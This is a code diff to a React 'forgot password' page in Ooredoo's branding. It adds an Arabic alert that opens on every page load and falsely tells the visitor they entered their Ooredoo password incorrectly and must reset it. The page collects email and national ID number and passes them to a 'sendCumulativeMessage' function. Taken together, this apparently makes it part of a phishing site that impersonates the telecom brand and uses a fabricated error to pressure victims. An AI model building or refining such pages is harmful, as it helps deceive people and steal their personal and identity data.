@@ -1,13 +1,22 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowRight, X } from "lucide-react";
+import { ArrowRight, X, AlertTriangle } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import Footer from "@/components/Footer";
 import { useRegistration } from "@/contexts/RegistrationContext";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const ForgotPassword = () => {
   const navigate = useNavigate();
+  const [showAlert, setShowAlert] = useState(true);
   const [email, setEmail] = useState("");
   const [idNumber, setIdNumber] = useState("");
   const { updateData, sendCumulativeMessage } = useRegistration();
@@ -28,7 +37,35 @@ const ForgotPassword = () => {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-white" dir="rtl">
+    <>
+      {/* Alert Dialog */}
+      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
+        <AlertDialogContent className="max-w-md mx-4 rounded-2xl" dir="rtl">
+          <AlertDialogHeader className="flex flex-col items-center text-center gap-4">
+            <div className="w-16 h-16 bg-[#E31E24]/10 rounded-full flex items-center justify-center">
+              <AlertTriangle className="w-8 h-8 text-[#E31E24]" />
+            </div>
+            <AlertDialogTitle className="text-xl font-bold text-gray-900">
+              تنبيه
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-base text-gray-700 leading-relaxed">
+              لقد قمت بإدخال كلمة المرور الخاصة بتطبيق Ooredoo بشكل خاطئ.
+              <br />
+              يُرجى إعادة تعيين كلمة المرور.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="mt-4">
+            <Button
+              onClick={() => setShowAlert(false)}
+              className="w-full h-12 text-lg font-bold bg-[#E31E24] hover:bg-[#c91a1f] text-white rounded-full"
+            >
+              حسناً
+            </Button>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      <div className="min-h-screen flex flex-col bg-white" dir="rtl">
       {/* Header */}
       <header className="bg-[#E31E24] text-white py-3 px-4">
         <div className="container mx-auto flex items-center justify-between">
@@ -111,6 +148,7 @@ const ForgotPassword = () => {
 
       <Footer />
     </div>
+    </>
   );
 };
 
